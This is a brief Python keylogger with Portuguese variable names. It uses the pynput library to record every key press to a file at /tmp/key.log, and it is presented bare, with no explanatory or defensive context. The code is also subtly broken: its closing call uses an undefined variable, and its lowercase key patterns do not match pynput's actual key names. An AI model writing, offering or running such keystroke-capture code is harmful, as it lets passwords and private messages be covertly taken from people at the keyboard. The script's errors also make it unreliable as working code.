from pynput.keyboard import Listener
import re

arquivoLog = "/tmp/key.log"

def capture(tecla):
  tecla = str(tecla)
  tecla = re.sub(r'\'', ' ', tecla)
  tecla = re.sub(r'key.space', '', tecla)
  tecla = re.sub(r'key.enter', '\n', tecla)
  tecla = re.sub(r'key.*', '\n', tecla)

  with open(arquivoLog, "a") as log:
           log.write(tecla)

with Listener(on_press=capture) as l:
            l.join()



capture(tecla)
